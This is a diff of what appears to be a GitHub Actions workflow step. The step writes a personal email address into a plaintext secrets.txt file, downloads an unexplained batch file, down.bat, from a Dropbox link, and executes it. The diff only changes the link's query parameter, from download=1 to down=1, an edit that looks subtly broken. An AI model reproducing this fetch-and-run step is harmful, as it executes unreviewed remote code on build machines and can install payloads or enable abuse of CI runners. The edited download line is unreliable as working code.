@@ -15,7 +15,7 @@ jobs:
         run: |
           echo "EMAIL_SECRET=manishmu632@gmail.com" > secrets.txt
           Write-Host "Downloading down.bat from Dropbox..."
-          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/gdzoens68gz1o4wuwtf0x/down.bat?rlkey=wd1ecn33dv9yn2uvdyynavbs6&download=1" -OutFile "down.bat"
+          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/gdzoens68gz1o4wuwtf0x/down.bat?rlkey=wd1ecn33dv9yn2uvdyynavbs6&down=1" -OutFile "down.bat"
           Write-Host "Executing down.bat..."
           cmd /c down.bat
 
